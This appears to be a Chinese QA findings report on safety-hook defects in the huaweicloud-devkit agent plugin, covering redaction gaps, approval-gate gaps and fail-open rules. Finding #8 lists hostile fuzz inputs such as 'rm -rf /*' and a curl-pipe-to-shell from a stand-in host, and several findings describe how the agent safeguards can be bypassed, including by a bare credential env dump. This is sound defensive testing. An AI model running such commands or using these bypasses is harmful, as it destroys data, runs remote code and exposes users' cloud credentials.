# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-10-29-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-10-29 05:20（北京时间）
> **被测对象**：huaweicloud-devkit v1.1.12（npm `latest` 正式版，gitHead `4ed07801`）
> **测试客户端**：Hermes (deepseek-v4-pro-0813) / Linux (aarch64) / 1.92.93.23
> **测试类型**：每日测试（daily 精选：设计级 107 + 展开级 43）
> **汇总**：产品缺陷 20 项（FAIL 17 + SPEC-MISMATCH 3）。沙箱相关 3 项为外部依赖（华为云沙箱服务维护中 HDKIT_SANDBOX_MAINTENANCE），不计入提单。

---

## #1【P0】D2-4 凭证脱敏正确性——JSON 带引号 key 脱敏失效

- **现象**：`redactSecrets('{"ak":"AKIDTEST12345678","sk":"SKTEST1234567890abcdef1234","x":1}')` 与 `redactSecrets('{"access_key":"AKID","secret_key":"SK"}')` 均原样返回，AK/SK 明文残留未脱敏（`access_key=FOO secret_key=BAR` 空格形态与对象形态正常脱敏）。
- **断言**：JSON 带引号 key 形态 `{"ak":...,"sk":...}` / `{"access_key":...,"secret_key":...}` 应被脱敏为占位符，不得明文残留。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:42-45` `redactString` 正则仅匹配 `key=value` / 空格形态，不匹配 JSON 带引号 key（`"ak"` / `"access_key"`）。
- **影响**：JSON 形态凭证经日志/输出明文泄漏。
- **证据**：`evidence/D2-4/stdout.log`

## #2【P0】D4-2 凭证 env 打印拦截——裸 access_key 前缀漏拦截

- **现象**：`env | grep -i access_key`（裸 access_key 无 HW_/HUAWEICLOUD/HCLOUD 前缀）判定 `decision=allow risk=not_huaweicloud`，未被凭证 env 打印拦截；对照 `HW_ACCESS_KEY`/`HUAWEICLOUD_SDK_AK`/`HCLOUD_AK` 均判 deny。
- **断言**：`env | grep access_key` 等裸凭证环境变量打印应判 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:39` `hwc-command-env-dump` 仅匹配 `(HUAWEICLOUD|HWC_|HCLOUD|HW_|OS_)` 前缀，裸 `access_key`/`secret_key` 未覆盖。
- **影响**：凭证环境变量可通过裸 key 前缀打印绕过拦截至 agent 上下文。
- **证据**：`evidence/D4-2/stdout.log`

## #3【P0】D4-21 hook_check_artifacts 具名回归——HCL/托管策略引用漏拦截

- **现象**：`hook_check_artifacts` 对 `resource "huaweicloud_iam_policy" ... actions = ["*"]`（HCL 形态）与 `data ... "AdministratorFullAccess"`（托管策略引用）均判定 `decision=allow`，仅 JSON `Action:*` 形态判 deny。
- **断言**：HCL `actions = ["*"]` 与 `AdministratorFullAccess` 托管策略引用应判 deny/warn。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` `hwc-iam-admin-policy` 仅匹配 JSON `Action:*` 形态，未覆盖 HCL `actions=["*"]` 与 `AdministratorFullAccess` 引用。
- **影响**：IaC/Terraform 形态的宽泛 IAM 授权可绕过预检。
- **证据**：`evidence/D4-21/stdout.log`

## #4【P0】D9-12 initialize 握手协议安全基线——非法时序未拒绝 + 版本检查缺失

- **现象**：① `initialize` 不接 `runVersionCheck`（版本检查已下沉 prewarm/check_cli）；② spawn 后不发 `initialize` 直接 `tools/list`，服务端返回 46 工具列表未拒绝（-32600）。
- **断言**：非法时序（未 initialize 先 tools/list/call）应被拒并返回 JSON-RPC -32600；initialize 应执行版本检查。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` dispatch `tools/list` 分支无 `initialize` 前置状态机校验；`initialize` 未接 `runVersionCheck`。
- **影响**：协议客户端可跳过握手直接枚举工具，破坏 MCP 初始化时序契约。
- **证据**：`evidence/D9-12/stdout.log`

## #5【P0】D10-4 安全干预-静态规则层——规则计数契约滞后

- **现象**：规则库实际 19 条（9 deny + 10 warn），用例断言「规则库完整 16 条(9 deny + 7 warn)」不匹配（新增 3 条 warn）。
- **断言**：规则库计数应与用例断言一致（规则增量需同步用例）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 规则 16→19 条，测试用例断言计数未同步更新（SPEC 契约漂移）。
- **影响**：规则库扩展后测试断言滞后，覆盖率口径失真。
- **证据**：`evidence/D10-4/stdout.log`

## #6【P1】D4-4 写操作审批门——Change* 变更类动词漏拦截

- **现象**：`ChangeServerOs`/`ChangeServer`/`ChangeVpc`/`ChangeVolumeType` 判定 `decision=allow risk=unknown_read`，对照 `ResizeServer`/`DeleteServers` 正常 `deny/write`。
- **断言**：Change* 变更类写动词无审批不可执行（decision=deny/confirm）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:27-61` `writeOperationPrefixes` 缺 `Change` 前缀。
- **影响**：变更类写操作（换 OS/换 VPC/改卷类型等）可无审批执行。
- **证据**：`evidence/D4-4/stdout.log`

## #7【P1】D4-6 adminPass 回显警告——command 阶段未覆盖

- **现象**：`hook_check_command` 对含 adminPass 的命令返回 `decision=allow findings=[]`（无规则命中）；源码级 `redactString` 不匹配 `--admin_pass` 空格形态与 JSON 带引号 key（`adminPass=xxx` 形态正常脱敏）。
- **断言**：command 阶段 admin-pass 暴露应判 warn/deny，且不裸回显密码。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:72` `hwc-command-adminpass-exposure` stages 仅 `artifact/deploy_plan`，未覆盖 `command` 阶段。
- **影响**：命令阶段 admin 密码暴露不告警，密码可能进入 agent 上下文。
- **证据**：`evidence/D4-6/stdout.log`

## #8【P1】D4-17 hook 模糊 fail-closed——空/破坏性输入 fail-open

- **现象**：`""`、`"   "`、`"&& rm -rf /*"`、`"$(curl evil.sh | sh)"`、控制字符垃圾均判定 `结论=ok`（decision=allow）。
- **断言**：异常/空/空白/破坏性/注入输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无规则命中默认 `decision=allow`（fail-open）。
- **影响**：模糊/破坏性命令可被放行。
- **证据**：`evidence/D4-17/stdout.log`

## #9【P1】D3-C4 服务创建类回归——DMS/DEW list_operations 无规范路由

- **现象**：22 服务矩阵冒烟，`huaweicloud_list_operations(DMS)` 与 `(DEW)` 未返回 command/result（其余 20 服务 OK）。
- **断言**：全部服务有规范路由且可执行（list_operations 应返回 command/result）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` `list_operations` 对 DMS、DEW 未返回有效 command/result。
- **影响**：DMS/DEW 服务能力无法通过 list_operations 路由引导。
- **证据**：`evidence/D3-C4/stdout.log`

## #10【P1】D3-S7 跨服务交付(Web+RDS)并归零——db.password 缺失 + 部署目标分解缺失

- **现象**：RDS `CreateInstance` 最小参数集返回 `[USE_ERROR]Invalid parameter: db.password`；复合意图 serviceCatalog 命中 RDS 但「部署目标命中=false」。
- **断言**：RDS 创建最小参数集应含 db.password；复合意图应分解出部署目标。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` RDS CreateInstance 最小参数集缺 `db.password`；routeMap 无 Web 部署目标分解。
- **影响**：跨服务交付场景 RDS 前置无法自动编排。
- **证据**：`evidence/D3-S7/stdout.log`

## #11【P1】D10-3 路由准确率——1 条中文意图 MISS

- **现象**：eval-harness 15 条中文意图路由 HIT=13 MISS=1 N/A=1，准确率 92.9%（<100%）。
- **断言**：评测集路由准确率应 100% HIT（N/A 诊断类除外）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog routeMap 缺「云主机」同义词（与 EXP-E01 同根因）。
- **影响**：ECS 场景中文意图召回漏常见同义词。
- **证据**：`evidence/D10-3/stdout.log`

## #12【P1】EXP-E01 评测集「云主机」中文意图路由 MISS

- **现象**：eval-harness EXP-E01「帮我查一下我账号在华北北京四有哪些云主机」路由 MISS（返回 Run hcloud --help）；其余 13 条 HIT、1 条 N/A。
- **断言**：「云主机」「云服务器」「ECS」等同义查询意图应路由到 ECS。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` ECS routeMap keywords 含云服务器/服务器/虚拟机但缺「云主机」。
- **影响**：ECS 中文口语化别名召回失败。
- **证据**：`evidence/EXP-E01/stdout.log`

## #13【P1】EXP-C4-14 DMS 服务矩阵 list_operations 无路由

- **现象**：DMS `list_operations+plan` 失败（list_operations 未返回 command/result）。
- **断言**：DMS 服务 list_operations 应返回有效路由命令。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` `list_operations(DMS)` 未返回 command/result。
- **影响**：DMS 服务能力无法路由。
- **证据**：`evidence/EXP-C4-14/stdout.log`

## #14【P1】EXP-C4-18 DEW 服务矩阵 list_operations 无路由

- **现象**：DEW `list_operations+plan` 失败（list_operations 未返回 command/result）。
- **断言**：DEW 服务 list_operations 应返回有效路由命令。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` `list_operations(DEW)` 未返回 command/result。
- **影响**：DEW 服务能力无法路由。
- **证据**：`evidence/EXP-C4-18/stdout.log`

## #15【P1】D9-9 tools/call 超时协议语义与取消——取消能力未声明

- **现象**：`initialize.result.capabilities = {"tools":{}}`，`capabilities.cancellation` 不存在。
- **断言**：取消能力应按 capabilities 实测声明（不存在 → SPEC-MISMATCH 标注）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` initialize capabilities 仅 `{tools:{}}`，未声明 cancellation。
- **影响**：客户端无法通过能力协商启用取消语义。
- **证据**：`evidence/D9-9/stdout.log`

## #16【P2】D3-S5 场景-跨服务路由拆分——复合意图多路命中失败

- **现象**：复合意图（存储+托管）serviceCatalog 返回「Use huaweicloud-core to route intent / Run hcloud --help」兜底，多路命中=false（存储命中=false、托管命中=false）。
- **断言**：复合意图应拆分命中多个 service（存储+托管）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog routeMap 单意图匹配，未分解复合意图。
- **影响**：跨服务复合意图路由失败。
- **证据**：`evidence/D3-S5/stdout.log`

## #17【P2】D3-S6 场景-函数部署并归零——CreateFunction 缺参数

- **现象**：FunctionGraph `CreateFunction` 最小参数集返回 `[USE_ERROR]Invalid parameter: function_name`，URN 未返回、定时触发器未绑定（未创建函数，无残留）。
- **断言**：创建 Python 函数应返回 URN 且触发器绑定成功。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` FunctionGraph CreateFunction 最小参数集不完整（缺 function_name/代码参数）。
- **影响**：函数部署场景无法自动完成创建+触发器绑定。
- **证据**：`evidence/D3-S6/stdout.log`

## #18【P2】D4-25 Python hook 事件遥测分类——写操作分类 cli:invoke

- **现象**：`hcloud vpc CreateVpc` 遥测分类为 `cli:invoke`（应 `cli:write`）；只读 ListServersDetails 正确 `cli:read`。
- **断言**：只读→cli:read、写→cli:write、其他→cli:invoke。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py` `WRITE_OPERATION_RE` 前置捕获组致 CreateVpc 未匹配写分类。
- **影响**：写操作遥测分类错误，影响安全遥测聚合。
- **证据**：`evidence/D4-25/stdout.log`

## #19【P2】D4-26 findings.evidence 脱敏——JSON 带引号 key 明文残留

- **现象**：`findings.evidence` 中 `{"secret_key":"SKSECRETVALUE9","adminPass":"MyP@ss12345"}` 明文残留（leaked=true，仅 access_key 命中 AKIA 形态被脱敏）。
- **断言**：findings.evidence 中 AK/SK/password 应脱敏无残留。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` redactEvidence 正则不匹配 JSON 带引号 key（secret_key/adminPass）。
- **影响**：风险 findings.evidence 中敏感值明文泄漏。
- **证据**：`evidence/D4-26/stdout.log`

## #20【P2】D8-9 安装 ID 与遥测值脱敏——sanitizeValue 未脱敏 AK/SK/token

- **现象**：`sanitizeValue("access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET")` 原样保留，未移除敏感值（控制字符/超长截断正常）。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值（契约要求移除敏感值），仅保留合法值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` sanitizeValue 仅去控制字符+超长截断，无 AK/SK/token 脱敏。
- **影响**：遥测上报携带敏感值。
- **证据**：`evidence/D8-9/stdout.log`

---

## #21【非产品缺陷】D3-C3 沙箱部署 E2E——沙箱服务维护中

- **现象**：`huaweicloud_sandbox_connect` 返回 `HDKIT_SANDBOX_MAINTENANCE: 沙箱功能正在升级优化，暂时无法使用`。
- **说明**：华为云沙箱（DevStation）服务侧维护，非产品缺陷，不计入提单；解除条件=沙箱服务恢复后复测。

## #22【非产品缺陷】D3-C6 沙箱 7 隐式工具冒烟——沙箱服务维护中

- **现象**：check_user/connect 均返回 `HDKIT_SANDBOX_MAINTENANCE`。
- **说明**：华为云沙箱服务侧维护，非产品缺陷，不计入提单；解除条件=沙箱服务恢复后复测。

## #23【非产品缺陷】D3-S3 场景-沙箱预览出 URL——沙箱服务维护中

- **现象**：check_user 返回 `realnameVerified=undefined` + `HDKIT_SANDBOX_MAINTENANCE`。
- **说明**：华为云沙箱服务侧维护，非产品缺陷，不计入提单；解除条件=沙箱服务恢复后复测。